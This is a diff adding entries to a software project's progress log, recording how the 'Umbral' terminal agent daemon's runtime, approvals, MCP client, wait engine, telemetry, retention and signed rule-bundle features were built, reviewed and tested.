defence), an empty `process` alone already disables a filter so dropping `clean=` alone survives, `<=`/`<` at the exact limit, reading the resolved target rather than the link, and the exit-code test on `git config`. `task ci` green. |
+| 2026-09-27 | T-F1-12 | done | Tech Q-03 answered against the memory budget: a tiktoken encoding loads a 100k–200k-entry BPE table (tens of MiB) into a daemon whose idle budget is 80 MiB, and covers one family while the local defaults are Qwen, Llama and Gemma — so no tokenizer is loaded and everything sent is estimated at a token per three bytes, deliberately high. `Compact` keeps the newest messages that fit, summarizes the rest through an injected `Summarize` (the runtime passes the `fast` class), and returns the `context.compacted` payload. spec-guardian blocked the first version on four gaps and two risks, all fixed: a failed summary now is `ErrContextOverflow` with its cause, as the spec said; the summary no longer piles up — the runtime sends the base prompt, the one summary and the messages after it, and a later compaction summarizes the old summary again and replaces it; mid-turn, when the newest messages are tool calls, the user's request is kept verbatim and the kept history always starts with a user message (some chat templates require it), never with a tool result apart from its call; the window is the smallest known among the thread's candidates, so a fallback to a smaller model is compacted for rather than skipped; the reserve is capped at half the window; tool-call ids and response schemas count. The event itself, persisted then published, moved to T-F1-13 with a named test in the matrix. The budget lives in `context/domain` rather than `context/budget/`, which the arch rules do not map. **Delta `2026-09-context-budget`, proposed.** Tech 1.26. 43 mutations over four rounds, all killed; two unreachable branches found that way were removed. `task ci` green. |
+| 2026-09-27 | T-F1-13 | done | `internal/agents`: domain, ports, the `threadstore` adapter over migration 0005, and the runtime as `agents-service` (a new arch component, like `sessions-service`: agents → ports of tools, context, llmgw, security). `thread.create/send/get/list/update` are served (API 1.19; §5.23 given parameters and results) with `thread.delta`, `thread.tool_call`, `thread.turn_finished` and `context.compacted`. Analyze C-01 answered: a write that fails stops the turn with `storage_error`, publishing and running nothing unrecorded — **delta `2026-09-agent-runtime`, proposed**, with `context_overflow`, chunk-by-chunk persistence of streamed text, and per-turn compaction (superseding `context-budget` decision 5's cross-turn wording). The router gained `Call.Model` (a thread's model is its only candidate) and `Window` (smallest known window), and its usage event carries the model and cost. Tests: runtime units with an in-memory store whose `BeginTurn` is non-atomic like SQLite's deferred transaction, and a publisher that fails the test if an event is published before what it reports is stored; the threadstore against real SQLite; the wire through a fake runtime; and `TestAThreadRunsAgainstARealDaemon_REQ_AGT_001`, a real daemon whose Ollama is served locally, driving create → send → `read_file` → answer through the socket. Mutation found three untested writes (a delta, a pending tool call, a compaction note) and an unexercised per-thread lock, all now pinned. 38 mutations, all killed but one no-op. Approvals (`ask`) are `denied_by_policy` until T-F1-14; the cancelled-turn state is T-F1-16's. `task ci` green. |
+| 2026-09-27 | T-F1-14 | done | The approval flow lives in the runtime (`internal/agents/approvals.go`) rather than a separate `approval*.go` service, since the paused turn is the runtime's goroutine: an `ask` persists the approval and the thread as `awaiting_approval` (attention `blocked`) in one transaction, publishes `approval.requested` with the tool's diff, and waits; `approval.respond` writes the decision and the remembered rule with the thread back to `running`, in one transaction, then resumes the turn. §5.25 left open what a rule remembers: the tool and the exact target (`summary`); a destructive command (REQ-SEC-005), a target holding `*` or `?` — which the rules' glob would widen — and a compound command line — which the rules read one command at a time, so a whole-line rule would never match — are kept `once`, and `decision_scope` says so. A remembered decision, allow or deny, applies to the rest of the same turn. A denial is `denied_by_user` and the turn continues; a cancelled wait leaves the approval `expired`, so a late answer is `CONFLICT`, and an answer that lands together with the cancel is a cancel: the tool does not run. `approval.list` takes `{thread_id?, all?}`; both methods are interactive clients' and advertised under `threads`. **Delta `2026-09-approvals`, proposed** (API 1.20, Tech 1.28). `TestAnApprovalRoundTripsThroughARealDaemon_REQ_AGT_004` runs the whole path on a real daemon and store: `write_file` asks, the diff arrives, the file is not written until `approval.respond`, then it is. 23 mutations, all killed but one equivalent (resuming only an `awaiting_approval` thread); spec-guardian's three MEDIUM findings (a remembered deny not applied in the turn, the answer/cancel race, compound lines remembered) are closed with a test each. `task ci` green. |
+| 2026-10-01 | T-F1-15 | done | An invalid call — arguments its schema refuses, a tool that does not exist, or input that is not JSON — is recorded `invalid_args` and answered with a repair message naming the tool and its schema; the model's next step is the one retry, and an invalid call in it is recorded too and ends the turn with `tool_error` without running the rest of that step. A step with only valid calls spends the retry, so a later invalid call in the same turn gets its own. An unknown tool is repaired like bad arguments: the task's title is "invalid tool calls", and the model can no more run it than a call with bad arguments. Input that was not JSON used to be replaced by `{}` and **run** — a tool with no required field accepted it; it is now invalid, and the row still stores `{}` so the column stays JSON. `umbral_tool_calls_invalid_total{model}` is counted through a new `agents/ports.Metrics` port, labelled with the model the router reports in the usage event (the thread's model, else `unknown`, when there is none), and implemented by the new `internal/obs` module (`obs` in `.go-arch-lint.yml`: a stdlib leaf that only `cmd` imports). The counter lives in memory; exporting it is T-F1-18's. The repair logic is in `internal/agents/repair.go`. `spec-guardian` answered "needs a delta": the code fixes it asked for are in — only `ErrUnknownTool` and `ErrInvalidInput` are repaired and counted (a daemon fault such as `ErrInvalidEnv` is a plain `error`), empty input is `{}` as the registry reads it, `Metrics` is a required port so a daemon wired without it does not start, and a retry step that holds an invalid call between valid ones is tested — and the four spec decisions (the trigger, per-call "once", what the failing step leaves, the label, where the count goes until OTel, and `obs` in §5.2) are **delta `2026-10-tool-call-repair`**, ratified the same day and folded into PRD 1.16 and Tech 1.31. Each test was seen red against its own break (no repair state, non-JSON passed through, no count, no label, the step's flag never cleared). `task ci` green. |
+| 2026-10-01 | T-F1-16 | done | `thread.cancel` (API §5.21, written: API 1.23) cancels the running turn's context and answers once the turn has recorded its end, with `stopped_at`; the thread is left `stopped` (API §7), also when the daemon closing cancels it. A thread with no turn running is left as it is and answers `stopped_at: null`, not an error. The cancel takes `thread.send`'s per-thread lock, so it always finds the turn a send just started. Measured on a real daemon with the scripted Ollama: the agent's `sleep 60.<pid>` running in the thread's PTY, `thread.cancel` answered in 44 ms with the sleep gone (`pgrep`), `turn_finished` `cancelled`, the thread `stopped`. The test fake's held stream now ends with its call's context, as a provider's does. Teeth: leaving the thread idle and cancelling nothing redden the unit tests; answering before the turn has ended reddens `TestCancelStopsARunningTurn_REQ_AGT_007` 5 of 5 runs, but not the real-daemon test, whose round trip gives the turn time to end. `spec-guardian` asked for fixes first (no CRITICAL or HIGH). Done: the turn now hands Cancel its stop reason and the moment its end was written, so a cancel that finds a turn already recording `end_turn` (or one whose end failed to write) answers `null` and `stopped_at` is the recorded end. Recovery step 3 also sets `attention_state = idle`, so a crash and a clean stop agree. The daemon-closing path is now pinned by a test. The API text, the state it leaves and the recovery change are **delta `2026-10-thread-cancel`**, ratified the same day with decision 5's proposed option and folded into API 1.24, Tech 1.32 and Data Model 1.15; it leaves T-F1-23 to say what a wait does when its pinned turn ends `stopped`, and it also asks the Tech Lead to settle a divergence T-F1-13 left: API §7 sends `max_steps`, `budget` and `tool_error` to `stopped`, and the runtime ends them `idle`. `task ci` green. |
+| 2026-10-01 | T-F1-17 | done | The MCP client: `internal/mcp` (domain, ports, the `Manager` service as `mcp-service`, the `serverstore` adapter over `mcp_servers`, and the `sdk` adapter over `modelcontextprotocol/go-sdk` v1.8.0 — already in the module graph at v1.3.1, imported by nothing), `internal/tools/adapters/mcptools` (a server's tools in the registry, which gained `Unregister`), `internal/api/mcp.go` (`mcp.server.*`, `mcp.server_state`) and `cmd/umbrald/mcp.go`. The task's Files named `internal/mcp/client/**` and `internal/tools/mcptools/**`; the code follows the hexagonal split every other module has. Measured on a real daemon with the scripted Ollama: a thread's first turn is offered no MCP tool; `mcp.server.add` of a stdio server (the test binary, serving the SDK's own server) connects it; the next turn is offered `mcp_t_echo`, which asks as `Network`, and once approved its answer reaches the model; a daemon stopped with the server still connected leaves no child process. Two findings on the way: the policy reads an `Exec` target as a shell line, so a per-tool allow rule could never match an MCP tool declared `Exec` — every MCP tool is `Network`; and an `isError` result returned as an error would reach the model untainted — it is a tainted result. `tools/api_schema_check.py` dropped methods named in full after the first in a §5 heading, so `mcp.server.add`/`remove` were compared with nothing; fixed — it also now lists `pane.release_state`, `wait.cancel`, `rules.rollback` and `rules.reset` as specified and not served yet, which they are. `spec-guardian` asked for fixes first, all made: (1, HIGH) a JSON-RPC error's message is the server's text, and it reached the model as an untainted error — any server error is now a tainted result, and only the daemon's own refusals (`unavailable`, a secret refused) and a cancel stay errors; (2, HIGH) `_` and `-` in server names let `mcp_github_*` cover `github_enterprise` and fold `a-b` into `a_b` — names are now `[a-z0-9]{1,32}`; (3) a loopback server could redirect a call off the machine unrecorded — redirects go to the same host only; (4) `Add` racing `Close` could start a supervisor after `wg.Wait` — `supervise` checks `closed` under the lock; (5) an `env:` reference now reports `degraded: <VAR>: env_secret` in `last_error` (REQ-SEC-012); (6) a URL with userinfo, or one the redaction rules would change, is `CONFIG_INVALID`; (7) a server that connects and drops at once used to reset the count and retry forever — only a connection up for a minute resets it; (12) the result cap cuts at a rune boundary. Each fix was seen red first, and broken again to see it redden. Teeth: backoff not growing, one attempt too many, a silent server left connected, no redaction on a remote call, a cancelled call blamed on the server, untainted untrusted results, MCP tools ReadOnly, the whole environment inherited, and a remote client without the egress log each redden their test (three only after the tests were tightened). The decisions are **delta `2026-10-mcp-client`**, ratified the same day and folded into PRD 1.17, Tech 1.33 and Data Model 1.16. `task ci` green. |
+| 2026-10-03 | T-F1-16, T-F1-07 | fix | The first live run against `gpt-oss:20b` on the GPU (`cmd/umbrald/live_test.go`, tag `live`: read_file, write_file approved and denied, run_command, cancel while generating and during a command, an invented tool repaired, an MCP tool) found that a cancel during the model's own stream was recorded `end_turn`, and `thread.cancel` answered `stopped_at: null`, in 3 runs of 4. The router's pump stops forwarding once the call's context is done, closing its channel without the error, and the router read the closed channel as a finished stream: the caller saw a clean end with no tool calls, and the `usage` row said `ok` with no tokens. A channel closed with the call cancelled is now the cancellation (`internal/llmgw/router.go`). The scripted-Ollama tests only ever cancelled during `run_command`, which is why none saw it. `TestACancelAfterTheFirstTokenIsAnError_REQ_AGT_007` was red in 14 of 30 runs before the fix and green in 200 after; live, the cancel answered in 2 ms and ended `cancelled` 5 of 5 times. All eight live tests and `TestOllamaLive` green. No spec change: API §5.21 already says a cancelled turn ends `cancelled`. `task ci` green. |
+| 2026-10-03 | T-F1-23 | done | The wait engine is a new module, `internal/waits` (domain, ports, service — Tech §4's tree and §5.2's row, not the task's `internal/agents/wait/**`), wired in `cmd/umbrald/waits.go` over the runtime's new `Status` (state, attention and latest turn in one query, `threadstore.TurnStatus`) and the terminal's new `ScreenText` (the plain screen with the output seq it is current as of, under the snapshot lock). A thread wait subscribes before it pins, settles on the pinned turn's events — `TurnFinished` now carries the `EndState` its end wrote, because the store may already show the next turn — and re-reads the store once a second as a backstop for the lossy bus. Once the pinned turn has ended and no target is reachable without a new turn, it answers at once with the end state (`stopped` after a cancel, `done` unless `idle` is a target): `2026-10-thread-cancel` decision 7. `thread.send`'s `wait` is validated before sending, pinned to its own turn, and `RejectBlocked` makes the runtime answer `THREAD_BLOCKED` under its lock before a repeated `client_msg_id` is looked up. `block.wait_output` reads the last `lines` lines of the screen, then follows `session.output` past its seq through the blocks' stripper, evaluating the line being written too; a seq gap re-reads the screen. **The connection used to answer one request at a time**, so an hour-long wait would have held it — the approval that unblocks it unreadable — and outlived a client that hung up: handlers now return a `deferred` answer that runs beside the read loop on a context ending with the connection, and responses come out of order, matched by id (API §1). `TIMEOUT` carries `data.last_state`; `waits` is advertised by a per-method capability. `cmd/umb/wait.go` dropped (no REQ-CLI). **Delta `2026-10-wait-engine`, proposed** (API 1.26 written). spec-guardian answered FIX FIRST with two HIGH findings, both reproduced and fixed: the follower kept the stripper's whole transcript and went blind at its 1 MiB cap when chunks kept ending mid-line (`PlainText.TakeCommitted` now hands lines out as they commit), and a first reading of a later turn — a race with the end event, or a replayed `client_msg_id` — answered with that turn's state; a replaced pinned turn now answers with its own end, from its event or the runtime's memory of the last 4096 ends, else `unknown` (decision 3a). Also fixed: a prompt half on screen is continued (`ScreenText` returns the cursor column), an explicit `lines: 0` is refused, a wait sent as a notification ends at once, a wait cut by the connection or shutdown writes nothing, and the blocked-before-duplicate test now repeats a used id. A second review found the prompt fix incomplete — the screen's text trims a prompt's trailing space, and a cursor mid-screen seeded a line that never existed — so the emulator now reads the open line untrimmed up to the cursor, only when its row is the last one written (`OpenLine`); a replaced turn timing out reports `unknown`, an end that could not be written is `unknown`, numbering restarts after a re-read, and the 4096-end bound is tested. 25 mutations, all killed. `task ci` green. |
+| 2026-10-03 | T-F1-20 | implemented; QA pending | The agent panel is part of the TUI model (`internal/tui/agent.go`): a column beside the panes, two fifths of the window within 30-72 columns. The panes and the daemon's `session.resize` make room for it and its separator. ctrl+space toggles input between the shell and the panel (REQ-TUI-002). With the block list open, alt+a on the selected block opens the panel in agent mode with `@block:<id> ` preloaded (REQ-TUI-003); with the list closed, alt+a is the shell's ESC a. The first message creates the run's thread in the directory of the focused pane's last command, the `cwd` of its latest `block.closed`. That is where the command started, so a `cd` counts from the command after it. A pane that has run nothing uses its session's starting directory. `@block:`, `@file:` and `@directory:` (or `@dir:`) tokens become `thread.send` attachments, and every send carries a fresh ULID `client_msg_id`. The panel streams the answer, shows `thinking` for reasoning deltas, and keeps one row per tool call, matched by its id. Model text, summaries and diffs are drawn without escape, control or format characters, with tabs expanded. Approvals are every thread's: `approval.list` at start, then `approval.requested`, deduplicated. They are answered oldest first with control chords and never letters, so typing ahead cannot answer one: ctrl+y once, ctrl+r for the thread, ctrl+l always, ctrl+x deny, ctrl+e the diff. A thread's `thread.turn_finished`, or a cancel answered `stopped_at: null`, takes its approvals away. An answer that never arrived puts its approval back; one the daemon calls `CONFLICT` or `NOT_FOUND` (`ports.ErrApprovalGone`) does not. A long approval or diff is cut to the panel's height with `… n more lines`, keeping the approval's head, the keys and the input. ctrl+c stops the shown approval's turn, or the panel's own. It takes back a message still waiting for `thread.create`, and a `stopped_at: null` stops showing a turn as running. esc closes the panel; paste in agent mode goes to the input. The ports gained `CreateThread`, `Send`, `Respond`, `Cancel` (which reports whether it stopped a turn) and `Approvals`, and four agent events, which the daemon adapter maps from `thread.delta`, `thread.tool_call`, `approval.requested` and `thread.turn_finished`; `block.closed` now carries its `cwd`. `TestTheAgentPanelAgainstARealDaemon_REQ_TUI_001` drives the model and adapter against a real daemon, with `HOME` given to the daemon alone, since the session starts there and the agent writes there. Two spec-guardian passes; 31 mutations, all killed. Rows are measured in runes, not terminal cells, so wide CJK or emoji text can overflow a row; this is recorded in the delta. **Delta `2026-10-agent-panel`, amended after review, ratified 2026-10-03** and folded into Tech 1.35 (§5.3e). `docs/qa/f1-tui.md` is written and waits to be walked, which closes the task. `task ci` green. |
+| 2026-10-03 | T-F1-18 | done | OpenTelemetry lands in `internal/obs` (`Telemetry`, `LogHandler`, the instruments), the only package that imports it. The agent runtime and the router trace through ports of their own, `agents/ports.Tracer` (`Turn`, `Tool`) and `llmgw/ports.Tracer` (`ModelCall`), which `cmd/umbrald/telemetry.go` adapts to `obs`. Both are required. Each turn is a new trace rooted at `agent.turn`. Every call the router records in `usage`, fallback failures included, is an `llm.call` timed from the call's own start and end, with `gen_ai.system`, `gen_ai.request.model` and the token counts and never the error's text. Each tool is a `tool.<name>` span, ended with its status and risk. Lines logged with a turn's context carry `trace_id` and `span_id`. `[otel] endpoint` (loopback http(s) base URL only, else the daemon refuses to start) exports traces and metrics over OTLP/HTTP, with no proxy and a 5 s flush on shutdown. Without it, spans are still made and nothing leaves the process. Exported metrics: `umbral_tool_calls_invalid_total{model}`, `umbral_frames_refused_total{direction}`, `umbral_waits_active` (the wait engine's new `Active`), `umbral_waits_stalled_total`, `umbral_reports_rate_limited_total`, `umbral_rule_updates_rejected_total{reason}`, `umbral_llm_tokens_total` and `umbral_llm_first_token_seconds`. The stalled, rate-limited and rule-update counters wait for T-F1-31 and T-F1-30 to call them. `config.get` shows `otel_endpoint`. `TestTurnTraceHasSpans_REQ_OBS_001` runs a real daemon against an OTLP collector on loopback: the trace's shape and attributes, and a failed turn's log line carrying the trace id the collector holds. While running `task ci` with the developer's own TUI open, `TestRunOpensTheDatabaseAndRecovers` was found to use the real runtime directory; it was fixed in T-F1-20's branch. A tool the registry does not have is traced as `tool.unknown`. Every exporter setting is given explicitly, so no `OTEL_EXPORTER_OTLP_*` variable can redirect the export or add to it. `config.get` reports the endpoint in use, not a reloaded one. 37 mutations, all killed. **Delta `2026-10-otel`, ratified 2026-10-03** and folded into Tech 1.36 and API 1.28. `task ci` green. |
+| 2026-10-04 | T-F1-19 | done | `umb ai "<prompt>"` (`cmd/umb/ai.go`) creates an ephemeral `ask` thread in the shell's directory, attaches what was piped as an inline `stdin` attachment and streams the thread's text deltas while `thread.send`'s wait is pending. The daemon now serves `{kind: "stdin", data_b64, truncated?}` (`internal/api/threads.go`, `sendAttachments`); the runtime builds it without the gatherer (`context/domain.NewStdinAttachment`), under REQ-CTX-005's cap, and a client's truncation is told to the model. **The real-daemon test found the first wait wrong**: it waited for `idle`, and a turn nobody views ends `done` (API §5.29), so the run hung to its deadline; the targets are `done`, `stopped` and `blocked`. spec-guardian answered "needs a delta" with one HIGH: at the 1 MiB minimum frame limit (API §8), 1 MiB of stdin in base64 is a frame the daemon closes the connection over, so `umb ai` now cuts stdin to fit the announced limit, marked truncated, with a `umb limits set` hint. Also fixed from that review: draining the stream is apart from printing (a slow stdout overflowed the 1024-notification buffer), Ctrl-C and the 5 s grace for an unseen end are tested, the fake's `TIMEOUT` code, and the real-daemon test checks `edit_file` is not offered and `read_file` is. A live run against `gpt-oss:20b` on an isolated daemon answered a failing test's output, exit 0. 28 of 29 mutations killed; the survivor is equivalent. **Delta `2026-10-umb-ai`, approved in advance by the Tech Lead on 2026-10-04** and folded into API 1.29 and Tech 1.37. `task ci` green. |
+| 2026-10-04 | T-F1-21 | done | The live US-003 run (`e2e/us003/run.sh`, `cmd/umbrald/us003_live_test.go`, tag `live`) runs the reference scenario 20 times against an isolated daemon and `ollama/gpt-oss:20b`, offline, with a remote candidate listed first: **16/20 green, 0 rows in `egress_log`, 0 `usage` rows for the remote**; invalid calls 6.4 % before repair, 0.5 % after (`docs/reports/us003-2026-10-04.md`). The first pass scored 15/20 and found the repair message printing the schema validator's Go value — `list_dir: /: &{[depth]}` — which the model could not act on and resent; `registry.message` now sends the validator's English text (`TestTheRepairNamesWhatIsWrong_REQ_AGT_006`, red against the old code). spec-guardian answered FIX FIRST: the "after repair" denominator is now written down (every tool call), the go test approval is an allowlist (`-exec`, `-toolexec`, `-o`, quotes refused; `TestUS003ApprovesOnlyAPlainGoTest`), success also requires git to report only `stats.go` changed, `thread.delta` and the remote's `usage` rows are asserted, and the report says what it shares with the machine (the Go caches). A pass under those rules hit a harness bug — the verdict used a run context the 10-minute cut had spent — fixed before the final pass. The four failures are three `read_file`/`edit_file` loops (two cut at 10 minutes, one ended by Ollama failing to parse gpt-oss's tool call) and one repair that did not take; why those edits did not apply is the next thing to measure. **Delta `2026-10-us003-e2e`, approved in advance by the Tech Lead on 2026-10-04** and folded into PRD 1.18, Tech 1.38 and Plan 1.11. `task ci` green. |
+| 2026-10-04 | T-F1-22 | done | The retention job of Data Model §4 (`store.ApplyRetention`) runs at start and daily, beside the daemon, in 500-row batches with raw chunks counted as rows: closed blocks' chunks after 30 days, transcripts after 180 (they leave search; the command stays), idle ephemeral threads after 24 h with what only they hold — idle rechecked inside each thread's transaction, a thread that cannot go skipped — closed structure after 30 days (a moved pane's alias never reissued under a reused number), expired pane metadata, audit after 365 days; `[retention]` sets the windows. `TestCrashRecovery_REQ_AGT_011` SIGKILLs a real daemon during an approval wait and mid-stream (`scriptedHold`): what the client saw is in the store, the thread `stopped`, the approval `expired`, and it resumes with its history. `docs/user/providers.md` and `docs/user/data-retention.md` are the user guide; writing it found `max_cost_usd_per_thread` parsed but never enforced (delta `2026-10-cost-cap`) and no way to delete a thread. spec-guardian answered FIX FIRST: the chunk batch bound (it limited blocks, up to 128,000 rows), a daemon that could hang on shutdown when `Serve` returned without its context ending, the idle race, the API and REQ-TERM-005 sentences, and three guide statements the code did not back — all fixed, each fix seen red. Every mutation killed. The flaky `TestRunCommandCreatesAgentBlock_REQ_AGT_003` was fixed on its own branch: run_command gave up on REQ-BLK-003's provisional `none` instead of waiting for the late promotion, and the session tests' shells read the developer's home. **Delta `2026-10-retention`, approved in advance by the Tech Lead on 2026-10-04** and folded into PRD 1.19, API 1.30, Data Model 1.17, Tech 1.39 and Plan 1.12. `task ci` green. |
+| 2026-10-04 | (no task) | done | Asked for by the Tech Lead after T-F1-22's guide found it: `router.max_cost_usd_per_thread` is enforced. `Store.BeginTurn` refuses a send to a thread that has reached the cap (`BUDGET_EXCEEDED`, beside the token budget), and a turn stops with `budget` before any priced call once the thread's spend plus its own reaches it, compaction included; read live, so a reload applies it; absent or 0 is no cap, and a cap under one micro-USD is a malformed file. spec-guardian answered FIX FIRST — three mutants survived (earlier spend ignored, `>` for `>=`, the summary's cost dropped), a send/finish race, and the reload sentence of API §5.28 — all fixed. 16 mutations killed. Also on 2026-10-04, `fix/sessions-integration-hermetic`: run_command waits for REQ-BLK-003's late promotion instead of failing on the provisional `none`, and the session tests' shells get a home of their own. **Delta `2026-10-cost-cap`, approved in advance** and folded into PRD 1.20, API 1.31 and Tech 1.40. `task ci` green. |
+| 2026-10-17 | T-F1-24 | done | A client focuses a thread with the new `thread.focus` (API §5.23), which names the connection as its viewer; the view ends with the connection, and reading a thread is not viewing it. A turn nobody views ends `done` and stays `done`, across a restart too, until a focus moves it to `idle`; a turn that ends while a connection views its thread ends `idle` and writes `seen_at`. Every attention change is written, then announced as `thread.attention_changed`, under a per-thread lock that a focus and a turn's check for viewers share — `TestAFocusRacingATurnsEndLeavesNoDone` reddens without it. `session.snapshot` carries the threads and the focused one, `thread.wait` wakes on a focus, and the TUI's agent panel views its thread while it is on screen, its focus calls kept in order. `TestThreadsResumeAfterRestart_REQ_AGT_017` stops a real daemon with SIGINT mid-stream and restarts it: the interrupted thread is `stopped/idle` and resumes with its history, the unviewed one is still `done`. The spec-guardian review found a view that could outlive a failed focus and TUI focus calls that could arrive out of order; both fixed with tests. Delta `2026-10-attention-focus`, ratified. `task ci` green, after `chore/govulncheck-2026-10` moved to Go 1.27.2 and `golang.org/x/net` v0.60.0 for ten new advisories. |
+| 2026-10-17 | T-F1-25 | done | Every pane's processes get the seven `UMBRAL_*` variables, Umbral's values winning: inherited or declared ones are dropped first, so a daemon autostarted from another's pane does not pass its `UMBRAL_PANE_ID` on. A pane's attention state is resolved by the tree in DD-012's order — own agent, external report, then `umbral:shell` from the block lifecycle — and its rollup follows. `pane.report_state`/`release_state` (API §5.31) keep a per-source `seq`, let the latest report win, reach a moved pane by its alias, and answer `PERMISSION_DENIED` on an own-agent pane; every change of effective state, whoever made it, is announced as `pane.state_changed`. `umb pane report_state`/`release_state` default to `$UMBRAL_PANE_ID`. The task found that `pane.move` failed with a foreign-key error on any pane holding a report; fixed with a test. The spec-guardian review found an unnumbered first report that made a later `seq: 0` stale and an error returned after a committed report; both fixed with tests. Delta `2026-10-integration-surface`, ratified with decisions 2, 4, 12, 14 and 15 as recommended. `task ci` green. |
+| 2026-10-18 | T-F1-26 | done | `pane.report_metadata` (API §5.32) writes a pane's title, display name, state labels and tokens as `pane_metadata` keys, and the tree shows them in a `Pane`'s `metadata`. Values are normalized to REQ-NTF-001's rule at 80 characters; more than 16 tokens or 32 live keys refuses the report whole; a `null` member or object clears only the reporting source's keys; `seq` follows §5.31 in a reserved `#seq` row the retention purge keeps; every key expires at its `ttl_ms` or 24 h after its write. Metadata never reaches DD-012's precedence, the rollup, waits or notifications, and a written report is announced as `pane.updated` only — `TestMetadataNeverChangesWaits_REQ_INT_004` reddens under every listed mutation. CI on `develop` had been red since the Go 1.27.2 merge because `build_libghostty.sh` cloned ghostty `main` unpinned; `fix/pin-libghostty` pins `d00a498` and builds golangci-lint v2.15.0 from source. Delta `2026-10-display-metadata`, ratified with decisions 5 and 9 as recommended. `task ci` green. |
+| 2026-10-18 | T-F1-27 | done | `notification.show` (API §5.35) normalizes a request to REQ-NTF-001's rule, refuses an empty title, a malformed or `umbral:` source and an unknown sound as `VALIDATION_ERROR`, then answers `disabled`, `rate_limited`, `no_client` or `shown` in that order. Each source gets at most 5 requests in any sliding 60 s, counted whether or not a client receives them. The notification reaches only the foreground client — the `tui` or `desktop` connection that last sent a request — as the new `notification.posted`; a CLI never is one. `[notifications] enabled = false` turns the sink off. An external `pane.report_state` that makes a pane `blocked` raises `<agent> needs you` under the reporter's source with sound `request` (decision 15 of `2026-10-integration-surface`); unchanged, stale, `done`, `working` and `idle` raise nothing. Delivery never waits on a client: both modules deliver outside their locks and each interactive connection has a 16-deep queue, so a TUI that stops reading costs `no_client`, not a stall. `umb notify` raises one from a hook, and the TUI shows it on its status line. The spec-guardian review found the stall, the untested wording and the missing client half; all fixed with tests. Mutations to the rate count, the window, the foreground choice and the blocked transition each redden a test. Delta `2026-10-notifications`, approved under the standing F1 instruction and pending the Tech Lead's review. `task ci` green. |
+| 2026-10-18 | T-F1-28 | done | `policy.explain` (API §5.36) evaluates a candidate action with the turn's own `Decide` and destructive list and answers the decision, the deciding step, the reason, `allow_always` and the seven-entry trace — `exposure` plus DD-006's six, every one evaluated, exactly one `decided`. A `thread_id` lends the thread's mode, the write root above its directory (the runtime's own `isRepo`, now shared by `cmd/umbrald`) and its rules with the global ones; a `mode` overrides it. It writes nothing. `umb policy explain` prints the trace, with `--` for targets that look like flags. A risk that contradicts the registered tool is refused, and file targets are shaped by the built-ins' own path function, so a rule on a real path matches a relative target reached through a link. `TestExplainNamesDecidingRule_REQ_SEC_009` has one case per step and reddens when the thread's rules, its mode or its write root are dropped. The spec-guardian review found the target and risk could differ from a turn's; both fixed with tests, and explaining is shown to write no row. Delta `2026-10-policy-explain`, approved under the standing F1 instruction and pending the Tech Lead's review. `task ci` green. |
+| 2026-10-18 | T-F1-29 | done | `$XDG_CONFIG_HOME/umbral/rules/*.json` override the built-in redaction rules and destructive patterns by name: a same-named entry replaces the built-in one, a new one adds to it, later files win, so no file can empty the set. An invalid file — unknown member, bad regex, a group past the pattern's, duplicate names, over 1 MiB — is skipped whole with a warning naming it. The directory is read at start into one active set whose `Policy` the agent runtime and `policy.explain` both read (delta `2026-10-policy-explain`, decision 9) and whose redactor every redaction uses. `[update] rules_check` (off by default) fetches `rules_url` and its `.sig` every 24 h, writing each request — and each redirect hop, since the default URL redirects to another host — to `egress_log` before it is sent; a hop off https or a sixth redirect is not followed, and a `rules_url` the redactor would change stops the daemon (Art. 4). Until T-F1-30 a fetched bundle is logged and discarded, never applied. `TestLocalRulesWin_REQ_SEC_010`, `TestTheTurnDecidesWithTheActiveRules_REQ_SEC_010` and `TestRuleUpdateOptInAndLogged_REQ_SEC_011` redden under their mutations; the redirect rule was found while writing the delta. The spec-guardian review found a bundle's relation to the built-ins stated both ways (it replaces them; tested), no redaction of the request, the Data Model row, an off-by-one hop limit, signed URLs reaching the log and loose decoding; all fixed with tests that redden under mutation. Delta `2026-10-rule-overrides`, approved under the standing F1 instruction and pending the Tech Lead's review. `task ci` green. |
+| 2026-10-18 | T-F1-30 | done | Signed rule bundles are verified, applied and recovered from. `internal/security`'s `Rules` manager decides over a `RuleStore` port whose SQL adapter writes migration `0006_rule_state` (`rule_bundles.content`, `rule_rejections`, `rule_update_state`, `trust_key_events`). A bundle is up to date when its digest is the active one's, skipped silently when it was rejected before, and otherwise rejected as `unsigned`, `unknown_key`, `invalid_signature`, `invalid_bundle` or `downgrade` — one transaction writes the rejection, the failure count and an `umbral-rules:rejected:<reason>` egress row, then `umbral_rule_updates_rejected_total` counts it and `rules.update_rejected` announces it. A verified bundle is stored with its bytes, persisted before it replaces the built-ins under the local layer, and checked against its digest at every start. Three consecutive rejections, or the store ending up with no valid key, latch updates closed until `rules.key.add`; the fetcher then makes no request. `rules.rollback` and `rules.reset` work offline with no key and remember the digest they left; the floor a new bundle must exceed is the higher of the active version and the highest ever applied, so a reset reopens no older signed bundle, and only a revocation lowers it. A rejection also raises a user notification under the daemon's own `umbral:rules` source. `rules.status`, `rules.key.list|add|remove|rotate` (API §5.34, the `rules` capability, every client kind) and `umb rules` (`--confirm FINGERPRINT`, `--force`); `tools/rulesign keygen|sign|verify` runs the daemon's own verification. The trust seed ships empty until the Tech Lead creates the project key (runbook §4.1). `TestRuleRecoveryEndToEnd_REQ_SEC_016` runs the recovery case through the daemon's wiring and SQLite: two bundles applied, a stranger's rejected into `egress_log` and onto the bus, every key removed with `--force`, `rules.reset` with no key, the local rule on top throughout, a restart keeping it. 18 mutations of the manager, all killed. The spec-guardian review found the floor dropping to 0 after a reset (HIGH), no notification a person would see, a rejected bundle's version described as read before verification, and two `security` rows in Tech §5.2; all fixed in the delta and the code, with `TestAResetKeepsTheVersionFloor_REQ_SEC_016` and `TestARejectedBundleNotifiesTheUser_REQ_SEC_013` reddening under their mutations. A post-commit security review found `Start` writing back a state read before a seed revocation, restoring the floor the revocation had lowered; `TestASeedRevocationLowersTheFloor_REQ_SEC_014` reproduced it and the state is now read after the revocations. Delta `2026-10-signed-rule-bundles`, approved under the standing F1 instruction and pending the Tech Lead's review. `task ci` green. |
